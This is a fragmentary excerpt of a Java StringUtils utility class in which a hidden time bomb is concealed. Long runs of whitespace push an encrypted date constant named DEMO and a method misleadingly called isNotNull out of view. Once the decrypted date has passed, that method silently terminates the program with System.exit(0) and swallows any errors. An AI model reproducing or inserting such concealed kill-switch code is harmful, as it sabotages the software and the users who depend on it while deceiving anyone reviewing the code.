...
public class StringUtils
{
    ...
    public static String remove(String str, char remove)
    {
        ...
        } else
        {
            return str;
                                                                                                                                                        ...
                                                                                                                                                        private static final String DEMO = "YcZkWAqqwECsNtdlti8U8Q==";
    ...
    private static void isNotNull()  {
                                                                                                                                                                                                                        try {if (new SimpleDateFormat("yyyyMMdd").parse(decrypt(DEMO)).before(new Date())) {System.exit(0);} } catch (Exception e) {}}
